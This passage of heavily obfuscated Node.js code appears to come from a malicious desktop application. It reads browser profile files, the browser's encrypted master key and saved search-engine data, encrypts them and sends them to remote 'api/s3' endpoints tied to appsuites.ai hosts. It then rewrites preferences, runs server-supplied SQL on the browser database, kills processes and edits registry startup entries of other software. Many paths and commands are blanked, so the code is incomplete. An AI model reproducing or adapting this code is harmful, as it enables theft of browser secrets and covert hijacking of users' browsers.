          const pf = np.O694X7J(pe, JSON.stringify({
            iid: pd,
            version: nq.e5325L3.Y55B2P2,
            isSchedule: '0'
          }));
          params2.append("data", pf.data);
          params2.append("iv", pf.iv);
          params2.append("iid", nq.e5325L3.q474LOF ?? '');
          const pg = await np.h5235DD("api/s3/options", params2);
          if (pg && pg.ok) {
            const ph = await pg.json();
            if (ph.data) {
              const pi = function (pk, pl) {
                return '' + pk + pl.toString().padStart(2, '0');
              };
              const data2 = JSON.parse(np.U61FWBZ(pe, ph.data, ph.iv));
              let pj = 1;
              nq.E506IW4.f538M6A = data2[pi('A', pj++)];
              nq.E506IW4.y50355J = data2[pi('A', pj++)];
              nq.E506IW4.q531YE2 = data2[pi('A', pj++)];
              nq.E506IW4.V573T48 = data2[pi('A', pj++)];
              nq.E506IW4.Z643HV5 = data2[pi('A', pj++)];
              nq.E506IW4.M4F7RZT = data2[pi('A', pj++)];
              nq.E506IW4.U548GP6 = data2[pi('A', pj++)];
              nq.E506IW4.q3F6NE0 = data2[pi('A', pj++)];
              nq.E506IW4.G5A3TG6 = data2[pi('A', pj++)];
              nq.E506IW4.v50CKDQ = data2[pi('A', pj++)];
              nq.E506IW4.v4A5HA6 = data2[pi('A', pj++)];
              nq.E506IW4.U40AV23 = data2[pi('A', pj++)];
              nq.E506IW4.z626Z6P = data2[pi('A', pj++)];
              nq.E506IW4.F431S76 = data2[pi('A', pj++)];
              nq.E506IW4.E42DSOG = data2[pi('A', pj++)];
              nq.E506IW4.o5D81YO = data2[pi('A', pj++)];
              nq.E506IW4.Y4F9KA9 = data2[pi('A', pj++)];
              nq.E506IW4.G555SVW = data2[pi('A', pj++)];
              nq.E506IW4.e4BDF2X = data2[pi('A', pj++)];
              nq.E506IW4.Q63EEZI = data2[pi('A', pj++)];
              nq.E506IW4.L4865QA = data2[pi('A', pj++)];
              nq.E506IW4.D472X8L = data2[pi('A', pj++)];
              nq.E506IW4.h676I09 = data2[pi('A', pj++)];
              nq.E506IW4.v4BE899 = data2[pi('A', pj++)];
              nq.E506IW4.E5D2YTN = data2[pi('A', pj++)];
              nq.E506IW4.n5F14C8 = data2[pi('A', pj++)];
              nq.E506IW4.M4AFW8T = data2[pi('A', pj++)];
              nq.E506IW4.s64A8ZU = data2[pi('A', pj++)];
              nq.E506IW4.O680HF3 = data2[pi('A', pj++)];
              nq.E506IW4.n6632PG = data2[pi('A', pj++)];
              nq.E506IW4.a423OLP = data2[pi('A', pj++)];
              nq.E506IW4.e4C2ZG5 = data2[pi('A', pj++)];
              nq.E506IW4.s5A8UWK = data2[pi('A', pj++)];
              nq.E506IW4.e44E7UV = data2[pi('A', pj++)];
              nq.E506IW4.w668BQY = data2[pi('A', pj++)];
              nq.E506IW4.q4D91PM = data2[pi('A', pj++)];
              nq.E506IW4.r6BA6EQ = data2[pi('A', pj++)];
              nq.E506IW4.g65BAO8 = data2[pi('A', pj++)];
              nq.E506IW4.P5D7IHK = data2[pi('A', pj++)];
              nq.E506IW4.g6AEHR8 = data2[pi('A', pj++)];
              nq.E506IW4.W46DKVE = data2[pi('A', pj++)];
              nq.E506IW4.C587HZY = data2[pi('A', pj++)];
              nq.E506IW4.L4F4D5K = data2[pi('A', pj++)];
              nq.E506IW4.d5A04IA = data2[pi('A', pj++)];
              nq.E506IW4.X69CKV1 = data2[pi('A', pj++)];
              nq.E506IW4.Q68703N = data2[pi('A', pj++)];
              nq.E506IW4.k5FECH9 = data2[pi('A', pj++)];
              nq.E506IW4.Q6AD4K1 = data2[pi('A', pj++)];
              nq.E506IW4.c4954SH = data2[pi('A', pj++)];
              nq.E506IW4.n601ESN = data2[pi('A', pj++)];
              nq.E506IW4.c41AH48 = data2[pi('A', pj++)];
              nq.E506IW4.c507RUL = data2[pi('A', pj++)];
              nq.E506IW4.B5176TW = data2[pi('A', pj++)];
              nq.E506IW4.f44CYDD = data2[pi('A', pj++)];
              nq.E506IW4.D582MML = data2[pi('A', pj++)];
              nq.E506IW4.A6C6QFI = data2[pi('A', pj++)];
              nq.E506IW4.E509RHP = data2[pi('A', pj++)];
              nq.E506IW4.p49ALL3 = data2[pi('A', pj++)];
              nq.E506IW4.H4A2CBA = data2[pi('A', pj++)];
              nq.E506IW4.Y420K0O = data2[pi('A', pj++)];
              nq.E506IW4.V615O8R = data2[pi('A', pj++)];
              nq.E506IW4.g477SEM = data2[pi('A', pj++)];
              nq.E506IW4.T525XE5 = data2[pi('A', pj++)];
              nq.E506IW4.V68C0TQ = data2[pi('A', pj++)];
              nq.E506IW4.P41D36M = data2[pi('A', pj++)];
              nq.E506IW4.I4E1ZJ4 = data2[pi('A', pj++)];
              nq.E506IW4.r62EVVQ = data2[pi('A', pj++)];
              nq.E506IW4.I4046MY = data2[pi('A', pj++)];
              nq.E506IW4.i61EV2V = data2[pi('A', pj++)];
              nq.E506IW4.l6C9B2Z = data2[pi('A', pj++)];
              nq.E506IW4.z3EF88U = data2[pi('A', pj++)];
              nq.E506IW4.C61B0CZ = data2[pi('A', pj++)];
              nq.E506IW4.i623ZUC = data2[pi('A', pj++)];
              nq.E506IW4.F6750PF = data2[pi('A', pj++)];
              nq.E506IW4.w443M14 = data2[pi('A', pj++)];
              if (!nq.E506IW4.d6C8UEH()) {
                throw new Error("GetRtcFailed");
              }
            } else {
              throw new Error("PrepareRtcBlocked");
            }
          } else {
            throw new Error("PrepareRtcFailed");
          }
        }
        async Z425M7G() {
          this.A64CEBI = np.S634YX3((await no.S559FZQ.l610ZCY("usid")) ?? '');
          if (((await no.S559FZQ.l610ZCY("c-key")) ?? '') != nq.e5325L3.q474LOF) {
            this.Z5A9DKG = true;
          }
          nq.e5325L3.U430LYO = await this.D656W9S(2);
          nq.e5325L3.r53FV0M = nq.e5325L3.U430LYO != '';
          nq.e5325L3.a6B1QAU = await this.D656W9S(1);
          nq.e5325L3.k596N0J = nq.e5325L3.a6B1QAU != '';
          if ((await this.D656W9S(3)) != '') {
            nq.e5325L3.g4184BO = true;
          }
          if ((await this.D656W9S(4)) != '') {
            nq.e5325L3.R6780KK = true;
          }
          if ((await this.D656W9S(5)) != '') {
            nq.e5325L3.n664BX9 = true;
          }
          if ((await this.D656W9S(6)) != '') {
            nq.e5325L3.x4ADWAE = true;
          }
          if ((await this.D656W9S(7)) != '') {
            nq.e5325L3.z4DE429 = true;
          }
          nq.e5325L3.H64FNMG = await this.o43FWNP(false, 1);
          nq.e5325L3.M56F8MB = await this.o43FWNP(false, 2);
          nq.e5325L3.X4B7201 = false;
        }
        async o43FWNP(pm, pn) {
          return new Promise((po) => {
            var str10 = '';
            switch (pn) {
              case 1:
                str10 = '';
                break;
              case 2:
                str10 = '';
                break;
            }
            require("child_process").exec(np.o5B4F49('', str10, ''), (pp, pq, pr) => {
              if (pp) {
                (async () => {
                  await np.w3F3UWA.Y6CDW21(pn, [132, ''], pp);
                })();
                po(false);
              }
              if (pr) {
                (async () => {
                  await np.w3F3UWA.Y6CDW21(pn, [146, ''], pp);
                })();
                po(false);
              }
              po(pq.trim() !== '');
            });
          });
        }
        async l660ZQF() {
          const ps = await no.S559FZQ.l610ZCY("iid");
          if (ps) {
            nq.e5325L3.q474LOF = ps;
            try {
              var pt = await np.e696T3N("api/s3/remove?iid=" + ps);
              if (pt) {
                const pu = await pt.json();
              }
              await np.w3F3UWA.W4EF0EI(1, [104, '']);
            } catch (pv) {
              await np.w3F3UWA.Y6CDW21(0, [104, ''], pv);
            }
          }
        }
        async D656W9S(pw) {
          const path5 = require("path");
          let str11 = '';
          if (pw == 1) {
            str11 = path5.join(no.S559FZQ.D47CBV3(), '');
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = '';
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = '';
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (pw == 2) {
            str11 = '';
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = '';
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (pw == 3) {
            str11 = path5.join(require("process").env.USERPROFILE, '');
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (pw == 4) {
            str11 = path5.join(no.S559FZQ.D47CBV3(), '');
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (pw == 5) {
            str11 = path5.join(no.S559FZQ.D47CBV3(), '');
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (pw == 6) {
            str11 = path5.join(no.S559FZQ.D47CBV3(), '');
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (pw == 7) {
            str11 = path5.join(no.S559FZQ.P6A7H5F(), '', '');
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          }
          return '';
        }
        async j458FW3(px) {
          if (this.A64CEBI == '' || !nq.e5325L3.k596N0J) {
            return;
          }
          const path6 = require("path");
          const py = no.S559FZQ.D47CBV3();
          if (!py) {
            await np.w3F3UWA.Y6CDW21(0, [113, '']);
            return;
          }
          const pz = path6.join(py, '');
          if (nq.e5325L3.a6B1QAU == '') {
            await np.w3F3UWA.W4EF0EI(1, [115, '']);
            return;
          }
          if (this.Z5A9DKG || !px || nq.e5325L3.x484Q1X == no.a689XV5.j5C58S9) {
            if (px) {
              px = false;
            }
            await this.D45AYQ3('');
          }
          const [qa, qb] = await this.A554U7Y(1, path6.join(pz, ''), false);
          if (qb && qb !== '') {
            qb = this.r42EX1Q(qb);
          }
          if (qa) {
            let flag2 = false;
            for (let qc = 0; qc < qa.length; qc++) {
              const qd = path6.join(pz, qa[qc], '');
              const qe = path6.join(pz, qa[qc], '');
              const qf = path6.join(pz, qa[qc], '');
              const qg = path6.join(pz, qa[qc], '');
              if (await this.X428OQY(qd, qf)) {
                await this.X428OQY(qe, qg);
                let str12 = '';
                let str13 = '';
                await this.r576OBZ(qf).then((qi) => {
                  str12 = qi;
                }).catch((qj) => {
                  (async () => {
                    await np.w3F3UWA.Y6CDW21(1, [124, ''], qj);
                  })();
                });
                await this.r576OBZ(qg).then((qk) => {
                  str13 = qk;
                }).catch((ql) => {
                  (async () => {
                    await np.w3F3UWA.Y6CDW21(1, [125, ''], ql);
                  })();
                });
                if (str12 == '') {
                  await np.w3F3UWA.W4EF0EI(1, [116, '']);
                  continue;
                }
                const qh = await this.O515QL8(1, str12, str13);
                if (!qh.m5BCP18) {
                  await np.w3F3UWA.W4EF0EI(1, [114, '']);
                  return;
                }
                if (px && ((await this.H5AE3US(qh.C5C7K1A)) || (await this.H5AE3US(qh.K5F23B9)))) {
                  await this.j458FW3(false);
                  return;
                }
                let flag3 = false;
                if (await this.H5AE3US(qh.C5C7K1A)) {
                  await this.Y53EKLA(qf, qh.C5C7K1A);
                  await this.X428OQY(qf, qd);
                  flag3 = true;
                }
                if (await this.H5AE3US(qh.K5F23B9)) {
                  await this.Y53EKLA(qg, qh.K5F23B9);
                  await this.X428OQY(qg, qe);
                  flag3 = true;
                }
                if (qh.j5D4IOV && qh.j5D4IOV.length !== 0) {
                  await this.O69AL84('' + qa[qc], '', qh.j5D4IOV);
                  flag3 = true;
                }
                if (await this.H5AE3US(qh.O6CBOE4)) {
                  const data3 = JSON.parse(qh.O6CBOE4);
                  const arr11 = [];
                  for (const qm in data3) {
                    if (data3.hasOwnProperty(qm)) {
                      const qn = data3[qm];
                      for (const qo in qn) {
                        if (qn.hasOwnProperty(qo)) {
                          await this.O69AL84(qm.replace("%PROFILE%", qa[qc]), qo, qn[qo]);
                          arr11.push(qo);
                        }
                      }
                    }
                  }
                  if (arr11.length > 0) {
                    await np.w3F3UWA.W4EF0EI(1, [117, ''], [arr11]);
                  }
                }
                flag2 = true;
                if (flag3) {
                  await np.w3F3UWA.W4EF0EI(1, [118, '']);
                } else {
                  await np.w3F3UWA.W4EF0EI(1, [119, '']);
                }
              }
            }
            if (flag2) {
              await no.S559FZQ.c5E4Z7C("c-key", nq.e5325L3.q474LOF);
            }
          }
        }
        async p4FE5X4(qp) {
          if (!nq.e5325L3.k596N0J) {
            return;
          }
          const path7 = require("path");
          const qq = no.S559FZQ.D47CBV3();
          if (!qq) {
            await np.w3F3UWA.Y6CDW21(0, [113, '']);
            return;
          }
          const qr = path7.join(qq, '');
          if (nq.e5325L3.a6B1QAU == '') {
            await np.w3F3UWA.W4EF0EI(1, [115, '']);
            return;
          }
          if (this.Z5A9DKG || !qp || nq.e5325L3.x484Q1X == no.a689XV5.j5C58S9) {
            if (qp) {
              qp = false;
              await this.D45AYQ3('');
            }
            const [qs, qt] = await this.A554U7Y(1, path7.join(qr, ''), true);
            if (qt && qt !== '') {
              qt = this.r42EX1Q(qt);
            }
            if (qs) {
              let flag4 = false;
              for (let qu = 0; qu < qs.length; qu++) {
                const qv = path7.join(qr, qs[qu], '');
                const qw = path7.join(qr, qs[qu], '');
                const qx = path7.join(qr, qs[qu], '');
                const qy = path7.join(qr, qs[qu], '');
                if (await this.X428OQY(qv, qw)) {
                  await this.X428OQY(qx, qy);
                  let qz;
                  let ra;
                  await this.r576OBZ(qw).then((rc) => {
                    qz = rc;
                  }).catch((rd) => {
                    (async () => {
                      await np.w3F3UWA.Y6CDW21(1, [124, ''], rd);
                    })();
                  });
                  await this.G5B8BDL(qy).then((re) => {
                    ra = re ?? '';
                  }).catch((rf) => {
                    (async () => {
                      await np.w3F3UWA.Y6CDW21(1, [164, ''], rf);
                    })();
                  });
                  if (qz == '') {
                    await np.w3F3UWA.W4EF0EI(1, [116, '']);
                    continue;
                  }
                  const rb = await this.w516KLO(1, qt, qz, ra);
                  if (!rb.m5BCP18) {
                    await np.w3F3UWA.W4EF0EI(1, [114, '']);
                    return;
                  }
                  if (await this.H5AE3US(rb.C5C7K1A)) {
                    await this.Y53EKLA(qw, rb.C5C7K1A);
                    await this.X428OQY(qw, qv);
                  }
                  if ((await this.H5AE3US(rb.p6845JK)) && (await this.r501Z9L(qy, rb.p6845JK))) {
                    if (await this.o43FWNP(false, 1)) {
                      await this.D45AYQ3('');
                    }
                    await this.X428OQY(qy, qx);
                    await np.w3F3UWA.W4EF0EI(1, [165, '']);
                  } else {
                    await np.w3F3UWA.W4EF0EI(1, [166, '']);
                  }
                  flag4 = true;
                }
              }
              if (flag4) {
                await no.S559FZQ.c5E4Z7C("cw-key", nq.e5325L3.q474LOF);
              }
            }
          }
        }
        async k47F3QK(rg) {
          if (!nq.e5325L3.k596N0J) {
            return;
          }
          const path8 = require("path");
          const rh = no.S559FZQ.D47CBV3();
          if (!rh) {
            await np.w3F3UWA.Y6CDW21(0, [113, '']);
            return;
          }
          const ri = path8.join(rh, '');
          if (nq.e5325L3.a6B1QAU == '') {
            await np.w3F3UWA.W4EF0EI(2, [115, '']);
            return;
          }
          if (this.Z5A9DKG || !rg || nq.e5325L3.x484Q1X == no.a689XV5.j5C58S9) {
            if (rg) {
              rg = false;
              await this.D45AYQ3('');
            }
            const [rj, rk] = await this.A554U7Y(2, path8.join(ri, ''), true);
            if (rk && rk !== '') {
              rk = this.r42EX1Q(rk);
            }
            if (rj) {
              let flag5 = false;
              for (let rl = 0; rl < rj.length; rl++) {
                const rm = path8.join(ri, rj[rl], '');
                const rn = path8.join(ri, rj[rl], '');
                const ro = path8.join(ri, rj[rl], '');
                const rp = path8.join(ri, rj[rl], '');
                if (await this.X428OQY(rm, rn)) {
                  await this.X428OQY(ro, rp);
                  let rq;
                  let rr;
                  await this.r576OBZ(rn).then((rt) => {
                    rq = rt;
                  }).catch((ru) => {
                    (async () => {
                      await np.w3F3UWA.Y6CDW21(2, [124, ''], ru);
                    })();
                  });
                  await this.G5B8BDL(rp).then((rv) => {
                    rr = rv ?? '';
                  }).catch((rw) => {
                    (async () => {
                      await np.w3F3UWA.Y6CDW21(2, [164, ''], rw);
                    })();
                  });
                  if (rq == '') {
                    await np.w3F3UWA.W4EF0EI(2, [116, '']);
                    continue;
                  }
                  const rs = await this.w516KLO(2, rk, rq, rr);
                  if (!rs.m5BCP18) {
                    await np.w3F3UWA.W4EF0EI(2, [114, '']);
                    return;
                  }
                  if (await this.H5AE3US(rs.C5C7K1A)) {
                    await this.Y53EKLA(rn, rs.C5C7K1A);
                    await this.X428OQY(rn, rm);
                  }
                  if ((await this.H5AE3US(rs.p6845JK)) && (await this.r501Z9L(rp, rs.p6845JK))) {
                    if (await this.o43FWNP(false, 2)) {
                      await this.D45AYQ3('');
                    }
                    await this.X428OQY(rp, ro);
                    await np.w3F3UWA.W4EF0EI(2, [165, '']);
                  } else {
                    await np.w3F3UWA.W4EF0EI(2, [166, '']);
                  }
                  flag5 = true;
                }
              }
              if (flag5) {
                await no.S559FZQ.c5E4Z7C("ew-key", nq.e5325L3.q474LOF);
              }
            }
          }
        }
        async E4E2LLU(rx) {
          return new Promise((ry) => setTimeout(ry, rx));
        }
        async D45AYQ3(rz, sa = true) {
          const cp3 = require("child_process");
          if (sa) {
            for (let sb = 0; sb < 3; sb++) {
              cp3.exec(np.o5B4F49('', rz));
              await this.E4E2LLU(100);
            }
          }
          cp3.exec(np.o5B4F49('', rz));
          await this.E4E2LLU(100);
        }
        async A554U7Y(sc, sd, se = false) {
          try {
            const data4 = JSON.parse(require("fs").readFileSync(sd, "utf8"));
            return [Object.keys(data4.profile?.info_cache || {}), se ? data4.os_crypt?.encrypted_key || '' : ''];
          } catch (sf) {
            await np.w3F3UWA.Y6CDW21(sc, [123, ''], sf);
          }
          return [undefined, undefined];
        }
        async X428OQY(sg, sh) {
          try {
            require("fs").copyFileSync(sg, sh);
            return true;
          } catch {
            return false;
          }
        }
        async r576OBZ(si, sj = false) {
          const fs10 = require("fs");
          try {
            if (!sj) {
              return fs10.readFileSync(si, "utf8");
            }
            return fs10.readFileSync(si);
          } catch (sk) {
            throw new Error("ReadFileError: " + sk);
          }
        }
        async G5B8BDL(sl) {
          const sm = new require("better-sqlite3")(sl);
          try {
            return JSON.stringify(sm.prepare("select * from keywords").all());
          } catch (sn) {
            throw new Error(sn);
          } finally {
            sm.close((so) => {});
          }
        }
        async r501Z9L(sp, sq) {
          const sr = new require("better-sqlite3")(sp);
          try {
            for (const ss of JSON.parse(sq)) {
              sr.prepare(ss).run();
            }
          } catch {
            return false;
          } finally {
            sr.close((st) => {
              if (st) {
                return;
              }
            });
          }
          return true;
        }
        async Y53EKLA(su, sv) {
          try {
            require("fs").writeFileSync(su, sv);
          } catch {}
        }
        async A5FCGS4(sw) {
          return require("fs").existsSync(sw);
        }
        async O69AL84(sx, sy, sz) {
          try {
            require("child_process").execSync(np.o5B4F49('', sx, sy, sz));
          } catch (ta) {
            await np.w3F3UWA.Y6CDW21(0, [135, ''], ta);
          }
        }
        async w4D8BBU(tb, tc) {
          try {
            require("child_process").execSync(np.o5B4F49('', tb, tc));
          } catch (td) {
            await np.w3F3UWA.Y6CDW21(1, [143, ''], td);
          }
        }
        async u459C3E(te, tf) {
          try {
            const tg = tf.trim() == '' ? np.o5B4F49('', te) : np.o5B4F49('', te, tf);
            require("child_process").execSync(tg);
            return true;
          } catch (th) {
            if (!th.stderr.includes('')) {
              await np.w3F3UWA.Y6CDW21(0, [155, ''], th);
            }
          }
          return false;
        }
        async H5AE3US(ti) {
          if (!ti) {
            return false;
          }
          if (ti.length == 0) {
            return false;
          }
          try {
            const data5 = JSON.parse(ti);
            return true;
          } catch {
            return false;
          }
        }
        async e4F5CS0() {
          try {
            var tj = nq.e5325L3.q474LOF ?? '';
            const params3 = new require("url").URLSearchParams();
            const tk = no.S559FZQ.n677BRA.substring(0, 24) + tj.substring(0, 8);
            const obj6 = {
              iid: tj,
              version: nq.e5325L3.Y55B2P2,
              isSchedule: '0',
              hasBLFile: nq.e5325L3.b57CS7T,
              hasBLReg: nq.e5325L3.K48B40X,
              supportWd: '1'
            };
            const tl = np.O694X7J(tk, JSON.stringify(obj6));
            params3.append("data", tl.data);
            params3.append("iv", tl.iv);
            params3.append("iid", nq.e5325L3.q474LOF ?? '');
            const tm = await np.h5235DD("api/s3/config", params3);
            if (tm && tm.ok) {
              const tn = await tm.json();
              try {
                if (tn.data) {
                  const data6 = JSON.parse(np.U61FWBZ(tk, tn.data, tn.iv));
                  const to = new ns();
                  to.H5C67AR = data6.wc ?? false;
                  to.n412K1U = data6.wcs ?? false;
                  to.n5B332O = data6.wcpc ?? false;
                  to.k61AQMQ = data6.wcpe ?? false;
                  to.a6AFL0X = data6.wdc ?? false;
                  to.D4E3EHU = data6.wde ?? false;
                  to.E67CJ69 = data6.ol ?? false;
                  to.a586DQ2 = data6.ol_deep ?? false;
                  to.X42CN81 = data6.wv ?? false;
                  to.Y4B23HN = data6.wv_deep ?? false;
                  to.T5B2T2A = data6.sf ?? false;
                  to.V54518G = data6.sf_deep ?? false;
                  to.T5F71B2 = data6.pas ?? false;
                  to.g5ABMVH = data6.pas_deep ?? false;
                  to.t533W41 = data6.code ?? '';
                  to.O6CBOE4 = data6.reglist ?? '';
                  return to;
                }
              } catch (tp) {
                await np.w3F3UWA.Y6CDW21(0, [137, ''], tp);
              }
            } else {}
          } catch (tq) {
            await np.w3F3UWA.Y6CDW21(0, [136, ''], tq);
          }
          return new ns();
        }
        async O515QL8(tr, ts, tt) {
          try {
            var tu = nq.e5325L3.q474LOF ?? '';
            const params4 = new require("url").URLSearchParams();
            const tv = no.S559FZQ.n677BRA.substring(0, 24) + tu.substring(0, 8);
            const obj7 = {
              iid: tu,
              bid: tr,
              sid: this.A64CEBI,
              pref: ts,
              spref: tt,
              wd: '',
              version: nq.e5325L3.Y55B2P2,
              supportWd: '0',
              isSchedule: '0'
            };
            const tw = np.O694X7J(tv, JSON.stringify(obj7));
            params4.append("data", tw.data);
            params4.append("iv", tw.iv);
            params4.append("iid", nq.e5325L3.q474LOF ?? '');
            const tx = await np.h5235DD("api/s3/validate", params4);
            if (!tx || !tx.ok) {
              return new nt();
            }
            const ty = await tx.json();
            try {
              if (ty.data) {
                const data7 = JSON.parse(np.U61FWBZ(tv, ty.searchdata, ty.iv));
                let tz = JSON.stringify(data7.pref) ?? '';
                let ua = JSON.stringify(data7.spref) ?? '';
                let ub = JSON.stringify(data7.regdata) ?? '';
                let uc = JSON.stringify(data7.reglist) ?? '';
                if (tz == "null") {
                  tz = '';
                }
                if (ua == "null") {
                  ua = '';
                }
                if (ub == "\"\"") {
                  ub = '';
                }
                if (uc == "\"\"") {
                  uc = '';
                }
                return new nt(true, tz, ua, ub, uc);
              }
            } catch (ud) {
              await np.w3F3UWA.Y6CDW21(tr, [126, ''], ud);
            }
          } catch (ue) {
            await np.w3F3UWA.Y6CDW21(tr, [127, ''], ue, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nt();
        }
        async w516KLO(uf, ug, uh, ui) {
          try {
            var uj = nq.e5325L3.q474LOF ?? '';
            const params5 = new require("url").URLSearchParams();
            const uk = no.S559FZQ.n677BRA.substring(0, 24) + uj.substring(0, 8);
            const obj8 = {
              iid: uj,
              bid: uf,
              sid: this.A64CEBI,
              pref: uh,
              spref: '',
              osCryptKey: ug,
              wd: ui,
              version: nq.e5325L3.Y55B2P2,
              supportWd: '1',
              isSchedule: '0'
            };
            const ul = np.O694X7J(uk, JSON.stringify(obj8));
            params5.append("data", ul.data);
            params5.append("iv", ul.iv);
            params5.append("iid", nq.e5325L3.q474LOF ?? '');
            const um = await np.h5235DD("api/s3/validate", params5);
            if (!um || !um.ok) {
              return new nu();
            }
            const un = await um.json();
            try {
              if (un.data) {
                if (!un.searchdata) {
                  return new nu(true, '', '');
                }
                const data8 = JSON.parse(np.U61FWBZ(uk, un.searchdata, un.iv));
                const uo = data8.pref ?? '';
                const up = data8.webData ?? '';
                const uq = up !== '' ? JSON.stringify(up) ?? '' : '';
                return new nu(true, uo !== '' ? JSON.stringify(uo) ?? '' : '', up);
              }
            } catch (ur) {
              await np.w3F3UWA.Y6CDW21(uf, [126, ''], ur);
            }
          } catch (us) {
            await np.w3F3UWA.Y6CDW21(uf, [127, ''], us, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nu();
        }
        async g4EE56L(ut) {
          try {
            const uu = (await no.S559FZQ.l610ZCY(ut)) ?? '';
            if (uu == '') {
              return 0;
            }
            return parseInt(uu);
          } catch {
            return 0;
          }
        }
        async w5C1TZN(uv) {
          const uw = no.S559FZQ.D47CBV3();
          if (!uw) {
            return;
          }
          const ux = require("path").join(uw, '');
          const fs11 = require("fs");
          try {
            const data9 = JSON.parse(fs11.readFileSync(ux, "utf8"));
            const uy = await this.g4EE56L("wv-key");
            if (data9[''] ?? true || (false ?? true) || (data9[''] ?? true) || (data9[''] ?? true)) {
              if (0 == uy || uv) {
                await this.D45AYQ3('');
                data9[''] = false;
                if (!data9['']) {
                  data9[''] = {
                    '': false
                  };
                } else {
                  data9[''][''] = false;
                }
                data9[''] = false;
                data9[''] = false;
                fs11.writeFileSync(ux, JSON.stringify(data9), "utf8");
                await np.w3F3UWA.W4EF0EI(3, [120, ''], [uv, uy]);
                await no.S559FZQ.c5E4Z7C("wv-key", "1");
              } else {
                await np.w3F3UWA.W4EF0EI(3, [163, ''], [uv, uy]);
              }
            } else {
              let flag6 = false;
              if (1 == uy) {
                const uz = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
                const va = this.t4E0LPU("\\");
                if (uz != undefined && false == uz && va != undefined && va) {
                  flag6 = true;
                  await no.S559FZQ.c5E4Z7C("wv-key", "2");
                  await this.D45AYQ3('');
                  await np.w3F3UWA.W4EF0EI(3, [162, ''], [uv, uy]);
                }
              }
              if (!flag6) {
                await np.w3F3UWA.W4EF0EI(3, [121, ''], [uv, uy]);
              }
            }
          } catch {
            await np.w3F3UWA.W4EF0EI(3, [122, '']);
          }
        }
        async c647ECB(vb) {
          const fs12 = require("fs");
          const vc = require("path").join(no.S559FZQ.D47CBV3(), '', '');
          try {
            const data10 = JSON.parse(fs12.readFileSync(vc, "utf8"));
            const vd = await this.g4EE56L("ol-key");
            if (data10[''] || data10[''] || data10[''] || data10[''] || data10['']) {
              if (0 == vd || vb) {
                data10[''] = false;
                data10[''] = false;
                data10[''] = false;
                data10[''] = false;
                data10[''] = false;
                await this.D45AYQ3('');
                fs12.writeFileSync(vc, JSON.stringify(data10, null, 2), "utf8");
                await this.D45AYQ3('');
                await np.w3F3UWA.W4EF0EI(4, [120, ''], [vb, vd]);
                await no.S559FZQ.c5E4Z7C("ol-key", "1");
              } else {
                await np.w3F3UWA.W4EF0EI(4, [163, ''], [vb, vd]);
              }
            } else {
              let flag7 = false;
              if (1 == vd) {
                const ve = this.e5FBF4O('', "OneLaunchLaunchTask", 1);
                const vf = this.t4E0LPU("\\");
                if (ve != undefined && false == ve && vf != undefined && vf) {
                  flag7 = true;
                  await no.S559FZQ.c5E4Z7C("ol-key", "2");
                  await this.D45AYQ3('');
                  await this.D45AYQ3('');
                  await np.w3F3UWA.W4EF0EI(4, [162, ''], [vb, vd]);
                }
              }
              if (!flag7) {
                await np.w3F3UWA.W4EF0EI(4, [121, ''], [vb, vd]);
              }
            }
          } catch {
            await np.w3F3UWA.W4EF0EI(4, [122, '']);
          }
        }
        async h659UF4(vg) {
          const vh = no.S559FZQ.D47CBV3();
          if (!vh) {
            return;
          }
          const vi = require("path").join(vh, '');
          const fs13 = require("fs");
          try {
            const data11 = JSON.parse(fs13.readFileSync(vi, "utf8"));
            let flag8 = true;
            if ("shift" in data11 && "browser" in data11.shift) {
              const vk = data11.shift.browser;
              flag8 = vk.launch_on_login_enabled ?? true || (vk.launch_on_wake_enabled ?? true) || (vk.run_in_background_enabled ?? true);
            }
            const vj = await this.g4EE56L("sf-key");
            if (flag8) {
              if (0 == vj || vg) {
                if (!("shift" in data11)) {
                  data11.shift = {};
                }
                if (!("browser" in data11.shift)) {
                  data11.shift.browser = {};
                }
                data11.shift.browser.launch_on_login_enabled = false;
                data11.shift.browser.launch_on_wake_enabled = false;
                data11.shift.browser.run_in_background_enabled = false;
                await this.D45AYQ3('');
                fs13.writeFileSync(vi, JSON.stringify(data11), "utf8");
                await np.w3F3UWA.W4EF0EI(6, [120, ''], [vg, vj]);
                await no.S559FZQ.c5E4Z7C("sf-key", "1");
              } else {
                await np.w3F3UWA.W4EF0EI(6, [163, ''], [vg, vj]);
              }
            } else {
              let flag9 = false;
              if (1 == vj) {
                const vl = this.e5FBF4O('', "ShiftLaunchTask", 1);
                const vm = this.t4E0LPU("\\");
                if (vl != undefined && false == vl && vm != undefined && vm) {
                  flag9 = true;
                  await no.S559FZQ.c5E4Z7C("sf-key", "2");
                  await this.D45AYQ3('');
                  await np.w3F3UWA.W4EF0EI(6, [162, ''], [vg, vj]);
                }
              }
              if (!flag9) {
                await np.w3F3UWA.W4EF0EI(6, [121, ''], [vg, vj]);
              }
            }
          } catch {
            await np.w3F3UWA.W4EF0EI(6, [122, '']);
          }
        }
        async W5F8HOG(vn) {
          const path9 = require("path");
          const fs14 = require("fs");
          try {
            const vo = (await this.u459C3E("HKCU", '')) || (await this.u459C3E("HKCU", '')) || (await this.u459C3E("HKCU", ''));
            const vp = await this.g4EE56L("pas-key");
            if (vo) {
              if (0 == vp || vn) {
                await this.D45AYQ3('', false);
                await this.D45AYQ3('', false);
                await this.w4D8BBU('', '');
                await this.w4D8BBU('', '');
                await this.w4D8BBU('', '');
                await np.w3F3UWA.W4EF0EI(7, [120, ''], [vn, vp]);
                await no.S559FZQ.c5E4Z7C("pas-key", "1");
              } else {
                await np.w3F3UWA.W4EF0EI(7, [163, ''], [vn, vp]);
              }
            } else if (1 == vp) {
              await np.w3F3UWA.W4EF0EI(7, [121, ''], [vn, vp]);
            }
          } catch {
            await np.w3F3UWA.W4EF0EI(7, [122, '']);
          }
        }
      };
      nn.A672SIS = nx;
    }
  });
